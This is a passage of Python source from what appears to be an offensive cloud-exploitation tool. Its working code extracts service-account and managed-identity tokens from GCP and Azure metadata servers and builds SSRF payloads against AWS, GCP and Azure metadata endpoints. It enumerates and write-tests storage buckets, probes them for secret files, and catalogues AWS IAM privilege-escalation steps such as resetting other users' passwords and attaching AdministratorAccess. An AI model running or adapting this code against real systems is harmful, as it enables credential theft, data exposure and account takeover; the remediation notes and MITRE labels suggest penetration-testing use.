                st_t, token_body, _ = self._http_request(token_url, headers=headers)
                if st_t == 200 and token_body:
                    try:
                        token_data = json.loads(token_body)
                        cred = CloudCredential(
                            credential_id=uuid.uuid4().hex[:16],
                            provider=CloudProvider.GCP,
                            credential_type=CredentialType.OAUTH_TOKEN,
                            principal=sa_email,
                            value=token_data.get("access_token", ""),
                            token=token_data.get("access_token", ""),
                            source="GCP_Metadata",
                            is_valid=True,
                            project_id=endpoint.metadata.get("project_id", ""),
                            expiration=time.time() + token_data.get("expires_in", 3600),
                            metadata={
                                "token_type": token_data.get("token_type", ""),
                                "expires_in": token_data.get("expires_in", 0),
                            },
                        )
                        creds.append(cred)
                        self._credentials.append(cred)
                        logger.info("Extracted GCP token for SA: %s", sa_email)
                    except (json.JSONDecodeError, KeyError):
                        pass

                # Get scopes
                scope_url = (
                    self.GCP_METADATA_BASE
                    + f"/computeMetadata/v1/instance/service-accounts/{sa}/scopes"
                )
                st_s, scopes_body, _ = self._http_request(scope_url, headers=headers)
                if st_s == 200 and scopes_body and creds:
                    creds[-1].permissions = [
                        s.strip() for s in scopes_body.strip().split("\n") if s.strip()
                    ]

            if creds:
                self._add_finding(
                    provider=CloudProvider.GCP,
                    category=AttackCategory.CREDENTIAL_HARVESTING,
                    severity=Severity.CRITICAL,
                    title=f"GCP Service Account Tokens Extracted ({len(creds)} accounts)",
                    description=(
                        "Successfully extracted OAuth2 access tokens for "
                        f"{len(creds)} service accounts from GCP metadata server."
                    ),
                    technique="GCP Metadata Token Extraction",
                    is_exploitable=True,
                    remediation="Use Workload Identity. Restrict metadata server access.",
                    mitre_attack_id="T1552.005",
                )

            return creds

    def extract_azure_credentials(self, endpoint: MetadataEndpoint) -> List[CloudCredential]:
        """Extract managed identity tokens from Azure IMDS."""
        with self._lock:
            creds: List[CloudCredential] = []
            headers = endpoint.headers

            for resource in self.AZURE_RESOURCES:
                token_url = "{}/metadata/identity/oauth2/token?api-version={}&resource={}".format(
                    self.AZURE_IMDS_BASE, self.AZURE_API_VERSION, resource
                )
                status, body, _ = self._http_request(token_url, headers=headers)
                if status == 200 and body:
                    try:
                        token_data = json.loads(body)
                        cred = CloudCredential(
                            credential_id=uuid.uuid4().hex[:16],
                            provider=CloudProvider.AZURE,
                            credential_type=CredentialType.MANAGED_IDENTITY_TOKEN,
                            principal=token_data.get("client_id", ""),
                            value=token_data.get("access_token", ""),
                            token=token_data.get("access_token", ""),
                            source="Azure_IMDS",
                            is_valid=True,
                            subscription_id=endpoint.metadata.get("subscription_id", ""),
                            expiration=float(token_data.get("expires_on", 0)),
                            metadata={
                                "resource": resource,
                                "token_type": token_data.get("token_type", ""),
                                "expires_in": token_data.get("expires_in", ""),
                                "not_before": token_data.get("not_before", ""),
                            },
                        )
                        creds.append(cred)
                        self._credentials.append(cred)
                        logger.info(
                            "Extracted Azure managed identity token for resource: %s", resource
                        )
                    except (json.JSONDecodeError, KeyError, ValueError):
                        pass

            if creds:
                self._add_finding(
                    provider=CloudProvider.AZURE,
                    category=AttackCategory.CREDENTIAL_HARVESTING,
                    severity=Severity.CRITICAL,
                    title=f"Azure Managed Identity Tokens Extracted ({len(creds)} resources)",
                    description=(
                        "Successfully extracted managed identity OAuth2 tokens for "
                        f"{len(creds)} Azure resources."
                    ),
                    technique="Azure IMDS Token Extraction",
                    is_exploitable=True,
                    remediation=(
                        "Use User-Assigned identities with least privilege. "
                        "Restrict IMDS access."
                    ),
                    mitre_attack_id="T1552.005",
                )

            return creds

    def extract_credentials(
        self, endpoints: Optional[List[MetadataEndpoint]] = None
    ) -> List[CloudCredential]:
        """Extract credentials from all detected metadata services."""
        with self._lock:
            eps = endpoints or self._endpoints
            all_creds: List[CloudCredential] = []

            for ep in eps:
                if not ep.is_accessible:
                    continue
                if ep.provider == CloudProvider.AWS:
                    all_creds.extend(self.extract_aws_credentials(ep))
                elif ep.provider == CloudProvider.GCP:
                    all_creds.extend(self.extract_gcp_credentials(ep))
                elif ep.provider == CloudProvider.AZURE:
                    all_creds.extend(self.extract_azure_credentials(ep))

            logger.info("Total credentials extracted: %d", len(all_creds))
            return all_creds

    def extract_userdata(self, endpoints: Optional[List[MetadataEndpoint]] = None) -> Dict[str, str]:
        """Extract instance user-data / startup scripts from metadata."""
        with self._lock:
            eps = endpoints or self._endpoints
            userdata: Dict[str, str] = {}

            for ep in eps:
                if not ep.is_accessible or not ep.userdata_path:
                    continue
                url = ep.base_url + ep.userdata_path
                status, body, _ = self._http_request(url, headers=ep.headers)
                if status == 200 and body:
                    key = f"{ep.provider.name}_userdata"
                    userdata[key] = body
                    secrets = self._scan_for_secrets(body)
                    if secrets:
                        self._add_finding(
                            provider=ep.provider,
                            category=AttackCategory.SECRETS_EXTRACTION,
                            severity=Severity.CRITICAL,
                            title=f"Secrets Found in {ep.provider.name} User-Data",
                            description=(
                                f"Found {len(secrets)} potential secrets/credentials in "
                                f"instance user-data/startup script."
                            ),
                            evidence={"secrets_types": list(secrets.keys())},
                            technique="User-Data Secret Extraction",
                            is_exploitable=True,
                            remediation="Never store secrets in user-data. Use secrets managers.",
                            mitre_attack_id="T1552.005",
                        )

            return userdata

    def _scan_for_secrets(self, text: str) -> Dict[str, List[str]]:
        """Scan text for potential secrets and credentials."""
        patterns = {
            "aws_access_key": r"(?:AKIA|ASIA)[0-9A-Z]{16}",
            "aws_secret_key": r"(?<![A-Za-z0-9/+=])[A-Za-z0-9/+=]{40}(?![A-Za-z0-9/+=])",
            "gcp_service_account": r'"type"\s*:\s*"service_account"',
            "private_key": r"-----BEGIN (?:RSA |EC )?PRIVATE KEY-----",
            "password_assignment": r"(?:password|passwd|pwd)\s*[=:]\s*['\"][^'\"]{4,}['\"]",
            "api_key_generic": r"(?:api[_-]?key|apikey)\s*[=:]\s*['\"][A-Za-z0-9_\-]{16,}['\"]",
            "bearer_token": r"[Bb]earer\s+[A-Za-z0-9_\-\.]{20,}",
            "connection_string": r"(?:mongodb|postgresql|mysql|redis)://[^\s'\"]+",
            "azure_storage_key": r"DefaultEndpointsProtocol=https;AccountName=[^;]+;AccountKey=[^;]+",
            "github_token": r"gh[pso]_[A-Za-z0-9_]{36,}",
            "slack_token": r"xox[bporas]-[A-Za-z0-9\-]+",
        }
        found: Dict[str, List[str]] = {}
        for name, pattern in patterns.items():
            matches = re.findall(pattern, text, re.IGNORECASE)
            if matches:
                found[name] = matches[:5]  # limit to 5 per type
        return found

    def generate_ssrf_payloads(self) -> List[Dict[str, Any]]:
        """Generate SSRF payloads for metadata service access."""
        payloads: List[Dict[str, Any]] = []

        # AWS payloads
        aws_paths = [
            "/latest/meta-data/iam/security-credentials/",
            "/latest/user-data",
            "/latest/dynamic/instance-identity/document",
        ]
        for bypass_url in self.SSRF_BYPASS_URLS:
            for path in aws_paths:
                payloads.append({
                    "provider": "AWS",
                    "url": bypass_url + path,
                    "method": "GET",
                    "headers": {},
                    "description": f"SSRF to AWS IMDS: {path}",
                })

        # GCP payloads
        gcp_token_path = "/computeMetadata/v1/instance/service-accounts/default/token"
        payloads.append({
            "provider": "GCP",
            "url": self.GCP_METADATA_BASE + gcp_token_path,
            "method": "GET",
            "headers": self.GCP_METADATA_HEADER,
            "description": "SSRF to GCP metadata for SA token",
        })

        # Azure payloads
        azure_token = (
            f"/metadata/identity/oauth2/token"
            f"?api-version={self.AZURE_API_VERSION}"
            f"&resource=https://management.azure.com/"
        )
        payloads.append({
            "provider": "Azure",
            "url": self.AZURE_IMDS_BASE + azure_token,
            "method": "GET",
            "headers": self.AZURE_IMDS_HEADER,
            "description": "SSRF to Azure IMDS for managed identity token",
        })

        return payloads

    def _add_finding(self, **kwargs: Any) -> CloudFinding:
        """Create and store a CloudFinding."""
        finding = CloudFinding(
            provider=kwargs.get("provider", CloudProvider.UNKNOWN),
            category=kwargs.get("category", AttackCategory.METADATA_EXPLOITATION),
            severity=kwargs.get("severity", Severity.INFO),
            title=kwargs.get("title", ""),
            description=kwargs.get("description", ""),
            technique=kwargs.get("technique", ""),
            evidence=kwargs.get("evidence", {}),
            remediation=kwargs.get("remediation", ""),
            mitre_attack_id=kwargs.get("mitre_attack_id", ""),
            is_exploitable=kwargs.get("is_exploitable", False),
            credential=kwargs.get("credential"),
            impact=kwargs.get("impact", ""),
        )
        self._findings.append(finding)
        return finding

    def get_findings(self) -> List[CloudFinding]:
        """Return all findings."""
        with self._lock:
            return list(self._findings)

    def get_credentials(self) -> List[CloudCredential]:
        """Return all discovered credentials."""
        with self._lock:
            return list(self._credentials)

    def to_dict(self) -> Dict[str, Any]:
        """Serialize exploiter state."""
        with self._lock:
            return {
                "endpoints": [ep.to_dict() for ep in self._endpoints],
                "credentials_count": len(self._credentials),
                "findings": [f.to_dict() for f in self._findings],
                "cache_size": len(self._metadata_cache),
            }


# ════════════════════════════════════════════════════════════════════════════════
# S3 BUCKET SCANNER — Storage Enumeration & Exploitation
# ════════════════════════════════════════════════════════════════════════════════

class S3BucketScanner:
    """
    Scans cloud storage buckets (S3, GCS, Azure Blob) for misconfigurations.

    Detects:
        - Public read/write/list access
        - Sensitive file exposure
        - Missing encryption
        - Overly permissive bucket policies
        - CORS misconfigurations
        - Versioning and logging status

    Usage:
        scanner = S3BucketScanner()
        findings = scanner.scan_bucket("my-bucket")
        all_findings = scanner.scan_wordlist(["dev", "staging", "prod"])
    """

    # Common bucket name patterns for enumeration
    BUCKET_WORDLIST_PATTERNS = [
        "{company}", "{company}-dev", "{company}-staging", "{company}-prod",
        "{company}-backup", "{company}-backups", "{company}-data",
        "{company}-assets", "{company}-media", "{company}-static",
        "{company}-uploads", "{company}-files", "{company}-logs",
        "{company}-config", "{company}-configs", "{company}-internal",
        "{company}-private", "{company}-public", "{company}-web",
        "{company}-api", "{company}-app", "{company}-mobile",
        "{company}-test", "{company}-testing", "{company}-qa",
        "{company}-uat", "{company}-demo", "{company}-docs",
        "{company}-documentation", "{company}-reports", "{company}-archive",
        "{company}-db", "{company}-database", "{company}-dump",
        "{company}-export", "{company}-import", "{company}-temp",
        "{company}-tmp", "{company}-cdn", "{company}-images",
        "{company}-videos", "{company}-downloads", "{company}-releases",
        "{company}-deploy", "{company}-deployment", "{company}-terraform",
        "{company}-cloudformation", "{company}-infra", "{company}-k8s",
        "{company}-kubernetes", "{company}-docker", "{company}-ci",
        "{company}-cicd", "{company}-jenkins", "{company}-artifacts",
        "{company}-packages", "{company}-npm", "{company}-pip",
        "{company}-maven", "{company}-gradle", "{company}-build",
        "{company}-builds", "{company}-dist", "{company}-release",
        "{company}-secrets", "{company}-keys", "{company}-certs",
        "{company}-certificates", "{company}-ssl", "{company}-tls",
        "{company}-audit", "{company}-compliance", "{company}-security",
        "{company}-monitoring", "{company}-metrics", "{company}-analytics",
        "{company}-billing", "{company}-invoices", "{company}-legal",
        "{company}-hr", "{company}-finance", "{company}-marketing",
        "{company}-sales", "{company}-customer", "{company}-users",
    ]

    # Sensitive file patterns to look for in bucket listings
    SENSITIVE_FILE_PATTERNS = [
        r"\.env$", r"\.env\.", r"\.pem$", r"\.key$", r"\.p12$", r"\.pfx$",
        r"\.jks$", r"\.keystore$", r"\.pkcs12$",
        r"id_rsa", r"id_ed25519", r"id_ecdsa",
        r"credentials\.json$", r"credentials\.xml$", r"credentials\.yaml$",
        r"service[_-]?account.*\.json$",
        r"\.git/", r"\.gitconfig$", r"\.gitignore$",
        r"\.aws/credentials$", r"\.aws/config$",
        r"\.ssh/", r"authorized_keys$", r"known_hosts$",
        r"\.bash_history$", r"\.zsh_history$",
        r"wp-config\.php$", r"config\.php$", r"settings\.py$",
        r"\.htpasswd$", r"\.htaccess$",
        r"password", r"passwd", r"shadow$",
        r"\.sql$", r"\.sql\.gz$", r"\.sql\.bz2$", r"dump\.sql",
        r"backup.*\.(tar|zip|gz|bz2|7z)$",
        r"database.*\.(tar|zip|gz|bz2)$",
        r"\.tfstate$", r"terraform\.tfvars$",
        r"docker-compose.*\.yml$", r"Dockerfile",
        r"kubeconfig", r"kube/config",
        r"\.npmrc$", r"\.pypirc$",
        r"token", r"secret", r"apikey", r"api[_-]?key",
        r"\.p7b$", r"\.cer$", r"\.crt$", r"\.der$",
    ]

    # AWS S3 regions
    AWS_S3_REGIONS = [
        "us-east-1", "us-east-2", "us-west-1", "us-west-2",
        "eu-west-1", "eu-west-2", "eu-west-3", "eu-central-1",
        "eu-north-1", "eu-south-1",
        "ap-southeast-1", "ap-southeast-2", "ap-northeast-1",
        "ap-northeast-2", "ap-northeast-3", "ap-south-1",
        "sa-east-1", "ca-central-1", "me-south-1", "af-south-1",
    ]

    def __init__(self, timeout: float = 5.0, max_concurrent: int = 10) -> None:
        self._lock = threading.RLock()
        self._timeout = timeout
        self._max_concurrent = max_concurrent
        self._findings: List[BucketFinding] = []
        self._scanned_buckets: Set[str] = set()
        self._sensitive_patterns = [
            re.compile(p, re.IGNORECASE) for p in self.SENSITIVE_FILE_PATTERNS
        ]
        logger.info("S3BucketScanner initialized (timeout=%.1fs)", timeout)

    def _http_request(
        self,
        url: str,
        headers: Optional[Dict[str, str]] = None,
        method: str = "GET",
        timeout: Optional[float] = None,
    ) -> Tuple[int, str, Dict[str, str]]:
        """Execute HTTP request."""
        _timeout = timeout or self._timeout
        try:
            req = urllib.request.Request(url, headers=headers or {}, method=method)
            with urllib.request.urlopen(req, timeout=_timeout) as resp:
                body = resp.read().decode("utf-8", errors="replace")
                resp_headers = {k.lower(): v for k, v in resp.getheaders()}
                return resp.status, body, resp_headers
        except urllib.error.HTTPError as e:
            body = ""
            try:
                body = e.read().decode("utf-8", errors="replace")
            except Exception:
                pass
            return e.code, body, {}
        except (urllib.error.URLError, socket.timeout, OSError):
            return 0, "", {}
        except Exception:
            return 0, "", {}

    def scan_s3_bucket(self, bucket_name: str, region: str = "us-east-1") -> BucketFinding:
        """Scan an AWS S3 bucket for misconfigurations."""
        with self._lock:
            finding = BucketFinding(
                provider=CloudProvider.AWS,
                bucket_name=bucket_name,
                region=region,
            )

            # Try different S3 URL formats
            urls = [
                f"https://{bucket_name}.s3.amazonaws.com",
                f"https://{bucket_name}.s3.{region}.amazonaws.com",
                f"https://s3.{region}.amazonaws.com/{bucket_name}",
            ]
            finding.bucket_url = urls[0]

            # Test bucket existence and public listing
            for url in urls:
                status, body, resp_headers = self._http_request(url)
                if status == 200:
                    finding.is_public = True
                    finding.allows_listing = True
                    finding.permission = StoragePermission.PUBLIC_READ
                    finding.severity = Severity.CRITICAL

                    # Parse XML listing for sensitive files
                    sensitive = self._find_sensitive_files_xml(body)
                    finding.sensitive_files = sensitive
                    finding.file_count = body.count("<Key>")
                    break
                elif status == 403:
                    # Bucket exists but listing denied
                    finding.permission = StoragePermission.PRIVATE
                    finding.severity = Severity.LOW
                    break
                elif status == 404:
                    finding.severity = Severity.INFO
                    finding.metadata["exists"] = False
                    break

            # Test public write (PUT)
            if finding.is_public:
                test_key = f"siren-probe-{uuid.uuid4().hex[:8]}.txt"
                put_url = f"{urls[0]}/{test_key}"
                st_put, _, _ = self._http_request(
                    put_url, method="PUT", timeout=3.0
                )
                if st_put in (200, 204):
                    finding.allows_upload = True
                    finding.permission = StoragePermission.PUBLIC_WRITE
                    finding.severity = Severity.CRITICAL
                    # Clean up test file
                    self._http_request(put_url, method="DELETE", timeout=2.0)

            # Check for common sensitive files directly
            if not finding.allows_listing:
                probe_files = [
                    ".env", "config.json", "credentials.json",
                    ".git/HEAD", "backup.sql", "terraform.tfstate",
                    "id_rsa", ".htpasswd", "wp-config.php",
                ]
                for probe in probe_files:
                    probe_url = f"{urls[0]}/{probe}"
                    st_p, body_p, _ = self._http_request(probe_url, timeout=2.0)
                    if st_p == 200 and body_p:
                        finding.sensitive_files.append(probe)
                        finding.is_public = True
                        finding.severity = Severity.CRITICAL

            self._findings.append(finding)
            self._scanned_buckets.add(bucket_name)
            return finding

    def scan_gcs_bucket(self, bucket_name: str) -> BucketFinding:
        """Scan a Google Cloud Storage bucket for misconfigurations."""
        with self._lock:
            finding = BucketFinding(
                provider=CloudProvider.GCP,
                bucket_name=bucket_name,
                bucket_url=f"https://storage.googleapis.com/{bucket_name}",
            )

            # Test public listing via JSON API
            list_url = (
                f"https://storage.googleapis.com/storage/v1/b/{bucket_name}/o"
                f"?maxResults=100"
            )
            status, body, _ = self._http_request(list_url)
            if status == 200 and body:
                finding.is_public = True
                finding.allows_listing = True
                finding.permission = StoragePermission.PUBLIC_READ
                finding.severity = Severity.CRITICAL
                try:
                    data = json.loads(body)
                    items = data.get("items", [])
                    finding.file_count = len(items)
                    for item in items:
                        name = item.get("name", "")
                        if self._is_sensitive_file(name):
                            finding.sensitive_files.append(name)
                        size = int(item.get("size", 0))
                        finding.total_size_bytes += size
                except (json.JSONDecodeError, KeyError, ValueError):
                    pass
            elif status == 403:
                finding.permission = StoragePermission.PRIVATE
                finding.severity = Severity.LOW
            elif status == 404:
                finding.metadata["exists"] = False
                finding.severity = Severity.INFO

            # Also test XML listing
            xml_url = f"https://storage.googleapis.com/{bucket_name}"
            st_xml, body_xml, _ = self._http_request(xml_url)
            if st_xml == 200 and body_xml and not finding.allows_listing:
                finding.is_public = True
                finding.allows_listing = True
                finding.permission = StoragePermission.PUBLIC_READ
                finding.severity = Severity.CRITICAL
                sensitive = self._find_sensitive_files_xml(body_xml)
                finding.sensitive_files.extend(sensitive)

            self._findings.append(finding)
            self._scanned_buckets.add(bucket_name)
            return finding

    def scan_azure_blob(self, account_name: str, container_name: str = "") -> List[BucketFinding]:
        """Scan Azure Blob Storage containers for misconfigurations."""
        with self._lock:
            findings: List[BucketFinding] = []
            base_url = f"https://{account_name}.blob.core.windows.net"

            containers = [container_name] if container_name else [
                "$web", "data", "backup", "backups", "uploads", "files",
                "images", "assets", "static", "public", "private",
                "logs", "config", "temp", "archive", "media",
            ]

            for container in containers:
                finding = BucketFinding(
                    provider=CloudProvider.AZURE,
                    bucket_name=f"{account_name}/{container}",
                    bucket_url=f"{base_url}/{container}",
                )

                # Test container listing
                list_url = f"{base_url}/{container}?restype=container&comp=list"
                status, body, _ = self._http_request(list_url)
                if status == 200 and body:
                    finding.is_public = True
                    finding.allows_listing = True
                    finding.permission = StoragePermission.PUBLIC_READ
                    finding.severity = Severity.CRITICAL
                    sensitive = self._find_sensitive_files_xml(body)
                    finding.sensitive_files = sensitive
                    finding.file_count = body.count("<Name>")
                elif status == 404:
                    continue  # Container doesn't exist
                elif status == 403:
                    finding.permission = StoragePermission.PRIVATE
                    finding.severity = Severity.LOW

                findings.append(finding)
                self._findings.append(finding)

            return findings

    def scan_wordlist(
        self,
        company_name: str,
        provider: CloudProvider = CloudProvider.AWS,
        custom_words: Optional[List[str]] = None,
    ) -> List[BucketFinding]:
        """Scan buckets using a wordlist based on company name."""
        with self._lock:
            results: List[BucketFinding] = []
            names = set()

            # Generate bucket names from patterns
            for pattern in self.BUCKET_WORDLIST_PATTERNS:
                names.add(pattern.format(company=company_name.lower()))

            # Add custom words
            if custom_words:
                for word in custom_words:
                    names.add(word.lower())

            # Add variations
            base = company_name.lower()
            for suffix in ["", "1", "2", "01", "02", "2024", "2025", "2026"]:
                names.add(base + suffix)
            for prefix in ["dev-", "stg-", "prd-", "test-"]:
                names.add(prefix + base)

            logger.info(
                "Scanning %d bucket name candidates for %s (%s)",
                len(names), company_name, provider.name,
            )

            for name in sorted(names):
                if name in self._scanned_buckets:
                    continue
                try:
                    if provider == CloudProvider.AWS:
                        finding = self.scan_s3_bucket(name)
                    elif provider == CloudProvider.GCP:
                        finding = self.scan_gcs_bucket(name)
                    else:
                        continue

                    if finding.is_public or finding.sensitive_files:
                        results.append(finding)
                        logger.info(
                            "Found accessible bucket: %s (public=%s, sensitive_files=%d)",
                            name, finding.is_public, len(finding.sensitive_files),
                        )
                except Exception as exc:
                    logger.debug("Error scanning bucket %s: %s", name, exc)

            return results

    def _find_sensitive_files_xml(self, xml_body: str) -> List[str]:
        """Extract sensitive file names from XML bucket listing."""
        sensitive: List[str] = []
        # Match <Key>...</Key> patterns in S3/GCS XML responses
        key_pattern = re.compile(r"<Key>([^<]+)</Key>", re.IGNORECASE)
        # Also match <Name>...</Name> for Azure
        name_pattern = re.compile(r"<Name>([^<]+)</Name>", re.IGNORECASE)

        all_files: List[str] = []
        all_files.extend(key_pattern.findall(xml_body))
        all_files.extend(name_pattern.findall(xml_body))

        for fname in all_files:
            if self._is_sensitive_file(fname):
                sensitive.append(fname)

        return sensitive[:100]  # limit

    def _is_sensitive_file(self, filename: str) -> bool:
        """Check if a filename matches sensitive file patterns."""
        for pattern in self._sensitive_patterns:
            if pattern.search(filename):
                return True
        return False

    def get_findings(self) -> List[BucketFinding]:
        """Return all bucket findings."""
        with self._lock:
            return list(self._findings)

    def get_public_buckets(self) -> List[BucketFinding]:
        """Return only public bucket findings."""
        with self._lock:
            return [f for f in self._findings if f.is_public]

    def get_critical_findings(self) -> List[BucketFinding]:
        """Return only critical severity findings."""
        with self._lock:
            return [f for f in self._findings if f.severity == Severity.CRITICAL]

    def to_dict(self) -> Dict[str, Any]:
        """Serialize scanner state."""
        with self._lock:
            return {
                "scanned_buckets": len(self._scanned_buckets),
                "total_findings": len(self._findings),
                "public_buckets": len(self.get_public_buckets()),
                "critical_findings": len(self.get_critical_findings()),
                "findings": [f.to_dict() for f in self._findings],
            }


# ════════════════════════════════════════════════════════════════════════════════
# AWS EXPLOITER — IAM PrivEsc, Lambda, STS, EC2 Userdata
# ════════════════════════════════════════════════════════════════════════════════

class AWSExploiter:
    """
    AWS-specific exploitation engine with 20+ IAM privilege escalation paths.

    Capabilities:
        - IAM policy analysis and privesc path discovery
        - Lambda environment variable extraction
        - STS assume-role chain analysis
        - EC2 userdata secrets harvesting
        - Cross-account pivoting via trust policies

    Usage:
        exploiter = AWSExploiter(credential=aws_cred)
        paths = exploiter.find_privesc_paths()
        secrets = exploiter.extract_lambda_secrets()
    """

    # IAM PrivEsc paths with required permissions and API calls
    PRIVESC_PATHS: List[Dict[str, Any]] = [
        {
            "technique": PrivEscTechnique.AWS_CREATE_POLICY_VERSION,
            "name": "Create New IAM Policy Version",
            "required_permissions": ["iam:CreatePolicyVersion"],
            "api_calls": [
                {
                    "service": "iam",
                    "action": "CreatePolicyVersion",
                    "params": {"PolicyArn": "{policy_arn}", "PolicyDocument": "{malicious_policy}", "SetAsDefault": True},
                }
            ],
            "steps": [
                "Identify managed policies attached to current user/role",
                "Create new policy version with escalated permissions",
                "Set the new version as default",
                "New permissions take effect immediately",
            ],
            "impact": "Full administrator access via custom policy",
            "detection_risk": "high",
            "mitre": "T1098.003",
        },
        {
            "technique": PrivEscTechnique.AWS_SET_DEFAULT_POLICY_VERSION,
            "name": "Set Default Policy Version",
            "required_permissions": ["iam:SetDefaultPolicyVersion"],
            "api_calls": [
                {
                    "service": "iam",
                    "action": "SetDefaultPolicyVersion",
                    "params": {"PolicyArn": "{policy_arn}", "VersionId": "{version_id}"},
                }
            ],
            "steps": [
                "List all versions of attached managed policies",
                "Identify a version with higher privileges",
                "Set that version as the default",
            ],
            "impact": "Revert to a more permissive policy version",
            "detection_risk": "medium",
            "mitre": "T1098.003",
        },
        {
            "technique": PrivEscTechnique.AWS_CREATE_ACCESS_KEY,
            "name": "Create Access Key for Another User",
            "required_permissions": ["iam:CreateAccessKey"],
            "api_calls": [
                {
                    "service": "iam",
                    "action": "CreateAccessKey",
                    "params": {"UserName": "{target_user}"},
                }
            ],
            "steps": [
                "Identify a more privileged IAM user",
                "Create new access key pair for that user",
                "Use the new credentials to act as the target user",
            ],
            "impact": "Assume identity of more privileged user",
            "detection_risk": "high",
            "mitre": "T1098.001",
        },
        {
            "technique": PrivEscTechnique.AWS_CREATE_LOGIN_PROFILE,
            "name": "Create Console Login for User",
            "required_permissions": ["iam:CreateLoginProfile"],
            "api_calls": [
                {
                    "service": "iam",
                    "action": "CreateLoginProfile",
                    "params": {"UserName": "{target_user}", "Password": "{password}", "PasswordResetRequired": False},
                }
            ],
            "steps": [
                "Identify a user without console access",
                "Create a login profile with a known password",
                "Log into AWS Console as that user",
            ],
            "impact": "Console access as target user",
            "detection_risk": "high",
            "mitre": "T1098.001",
        },
        {
            "technique": PrivEscTechnique.AWS_UPDATE_LOGIN_PROFILE,
            "name": "Reset User Console Password",
            "required_permissions": ["iam:UpdateLoginProfile"],
            "api_calls": [
                {
                    "service": "iam",
                    "action": "UpdateLoginProfile",
                    "params": {"UserName": "{target_user}", "Password": "{new_password}", "PasswordResetRequired": False},
                }
            ],
            "steps": [
                "Identify a privileged user with console access",
                "Reset their password to a known value",
                "Log in as that user",
            ],
            "impact": "Hijack console access of target user",
            "detection_risk": "high",
            "mitre": "T1098.001",
        },
        {
            "technique": PrivEscTechnique.AWS_ATTACH_USER_POLICY,
            "name": "Attach Admin Policy to User",
            "required_permissions": ["iam:AttachUserPolicy"],
            "api_calls": [
                {
                    "service": "iam",
                    "action": "AttachUserPolicy",
                    "params": {"UserName": "{user}", "PolicyArn": "arn:aws:iam::aws:policy/AdministratorAccess"},
                }
            ],
            "steps": [
                "Attach AdministratorAccess managed policy to current user",
                "Full admin privileges acquired",
            ],
            "impact": "Full administrator access",
            "detection_risk": "high",
            "mitre": "T1098.003",
        },
        {
            "technique": PrivEscTechnique.AWS_ATTACH_GROUP_POLICY,
            "name": "Attach Admin Policy to Group",
            "required_permissions": ["iam:AttachGroupPolicy"],
            "api_calls": [
                {
                    "service": "iam",
                    "action": "AttachGroupPolicy",
                    "params": {"GroupName": "{group}", "PolicyArn": "arn:aws:iam::aws:policy/AdministratorAccess"},
                }
            ],
            "steps": [
                "Identify a group the current user belongs to",
                "Attach AdministratorAccess policy to the group",
                "All group members gain admin access",
            ],
            "impact": "Full administrator access for entire group",
            "detection_risk": "high",
            "mitre": "T1098.003",
        },
        {
            "technique": PrivEscTechnique.AWS_ATTACH_ROLE_POLICY,
            "name": "Attach Admin Policy to Role",
            "required_permissions": ["iam:AttachRolePolicy"],
            "api_calls": [
                {
                    "service": "iam",
                    "action": "AttachRolePolicy",
                    "params": {"RoleName": "{role}", "PolicyArn": "arn:aws:iam::aws:policy/AdministratorAccess"},
                }
            ],
            "steps": [
                "Attach AdministratorAccess to current role or assumable role",
                "Assume the role to gain admin privileges",
            ],
            "impact": "Full administrator access via role",
            "detection_risk": "high",
            "mitre": "T1098.003",
        },
        {
            "technique": PrivEscTechnique.AWS_PUT_USER_POLICY,
            "name": "Create Inline Admin Policy on User",
            "required_permissions": ["iam:PutUserPolicy"],
            "api_calls": [
                {
                    "service": "iam",
                    "action": "PutUserPolicy",
                    "params": {"UserName": "{user}", "PolicyName": "escalation", "PolicyDocument": "{admin_policy}"},
                }
            ],
            "steps": [
                "Create an inline policy with full admin access on current user",
                "Inline policy takes effect immediately",
            ],
            "impact": "Full administrator access via inline policy",
            "detection_risk": "medium",
            "mitre": "T1098.003",
        },
        {
            "technique": PrivEscTechnique.AWS_PUT_GROUP_POLICY,
            "name": "Create Inline Admin Policy on Group",
            "required_permissions": ["iam:PutGroupPolicy"],
            "api_calls": [
                {
                    "service": "iam",
                    "action": "PutGroupPolicy",
                    "params": {"GroupName": "{group}", "PolicyName": "escalation", "PolicyDocument": "{admin_policy}"},
                }
            ],
            "steps": [
                "Find a group the user belongs to",
                "Create an inline admin policy on the group",
            ],
            "impact": "Admin access for all group members",
            "detection_risk": "medium",
            "mitre": "T1098.003",
        },
        {
            "technique": PrivEscTechnique.AWS_PUT_ROLE_POLICY,
            "name": "Create Inline Admin Policy on Role",
            "required_permissions": ["iam:PutRolePolicy"],
            "api_calls": [
                {
                    "service": "iam",
                    "action": "PutRolePolicy",
                    "params": {"RoleName": "{role}", "PolicyName": "escalation", "PolicyDocument": "{admin_policy}"},
                }
            ],
            "steps": [
                "Add inline admin policy to current or assumable role",
                "Assume the role to gain admin access",
            ],
            "impact": "Full administrator access via role",
            "detection_risk": "medium",
            "mitre": "T1098.003",
        },
        {
            "technique": PrivEscTechnique.AWS_ADD_USER_TO_GROUP,
            "name": "Add Self to Privileged Group",
            "required_permissions": ["iam:AddUserToGroup"],
            "api_calls": [
                {
                    "service": "iam",
                    "action": "AddUserToGroup",
                    "params": {"GroupName": "{admin_group}", "UserName": "{user}"},
                }
            ],
            "steps": [
                "Identify a group with admin or elevated privileges",
                "Add current user to that group",
                "Inherit all group policies",
            ],
            "impact": "Inherit privileges of admin group",
            "detection_risk": "high",
            "mitre": "T1098.003",
        },
        {
            "technique": PrivEscTechnique.AWS_UPDATE_ASSUME_ROLE_POLICY,
            "name": "Modify Role Trust Policy",
            "required_permissions": ["iam:UpdateAssumeRolePolicy"],
            "api_calls": [
                {
                    "service": "iam",
                    "action": "UpdateAssumeRolePolicy",
                    "params": {"RoleName": "{role}", "PolicyDocument": "{trust_policy}"},
                }
            ],
            "steps": [
                "Find a privileged role",
                "Modify its trust policy to allow current principal to assume it",
                "Assume the role via STS",
            ],
            "impact": "Assume any role in the account",
            "detection_risk": "high",
            "mitre": "T1098.003",
        },
        {
            "technique": PrivEscTechnique.AWS_PASS_ROLE_LAMBDA,
            "name": "PassRole to Lambda for Execution",
            "required_permissions": ["iam:PassRole", "lambda:CreateFunction", "lambda:InvokeFunction"],
            "api_calls": [
                {
                    "service": "lambda",
                    "action": "CreateFunction",
                    "params": {"FunctionName": "escalation", "Role": "{admin_role_arn}", "Runtime": "python3.9"},
                },
                {
                    "service": "lambda",
                    "action": "InvokeFunction",
                    "params": {"FunctionName": "escalation"},
                },
            ],
            "steps": [
                "Identify a role with higher privileges and lambda trust",
                "Create a Lambda function with that role attached",
                "The function code performs privileged operations",
                "Invoke the function to execute with elevated privileges",
            ],
            "impact": "Execute code with admin role permissions",
            "detection_risk": "medium",
            "mitre": "T1098.003",
        },
